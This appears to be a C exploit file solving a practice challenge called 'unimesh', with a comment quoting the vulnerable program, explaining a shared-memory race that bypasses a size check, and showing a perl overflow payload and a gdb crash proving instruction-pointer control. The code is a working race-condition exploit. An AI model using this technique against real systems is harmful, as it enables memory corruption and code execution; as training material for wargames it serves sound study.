#include <stdio.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <string.h>
#include <stdlib.h>

/*

unimesh-chal.c below. getting a mapping to the shm allows us
to alter the content of the struct that is memcpy'd. we can
bypass the src->sz check by altering the content after the check
but before the memcpy call, so there's a race. 

the race is pretty easy to win, though. if you keep changing the
contents of the shm in a loop with one struct that is sane and
one with some malicious content, eventually you'll get lucky.

basic stack smashing protection makes this level unexploitable,
but since this is practise i don't feel bad about compiling it like so:

$ gcc -o unimesh-chal -fno-stack-protector unimesh-chal.c

which turns it into a basic stack overflow once you've gained control
of eip.

$ ./reth-vs-unimesh BBBB `perl -e 'print "A"x64'` & 
[1] 18438
$ ./unimesh-chal                                                                                                                                                          
Message: BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Bus error (core dumped) 
$ gdb -q -c unimesh-chal.core unimesh-chal                                                                                                                                
[...]
#0  0x4141414141414141 in ?? ()

#include <stdio.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <string.h>
struct x {
  int sz;
  char buf[16];
};
void handle(void *a) {
        struct x target, *src;
        src = a;
        if (src->sz >= 16U)
                return;
        gethostbyname("unimesh.org");
        memcpy(target.buf, src->buf, src->sz);
        printf("Message: %s\n", target.buf);
}
int main() {
        int id;
        void *addr;
        id = shmget(1337, sizeof(struct x), IPC_CREAT|0666);
        addr = shmat(id, NULL, 0);
        handle(addr);
}

*/

struct x {
	int sz;
	char buf[16];
};

int 
main(int argc, char *argv[])
{
	struct x hax, *s;
	void *p;
	int i, k;

	if (argc < 3)
		exit(-1);

	k = shmget(1337, sizeof(struct x), IPC_CREAT | 0666);
	if (k == -1) {
		perror("shmget");
		exit(-1);
	}
	s = (struct x *)shmat(k, NULL, 0);

	for (i = 0;; i = ((i + 1) % 2)) {
		strcpy(s->buf, argv[i+1]);
		s->sz = strlen(argv[i+1]);
	}

	return 0;
}
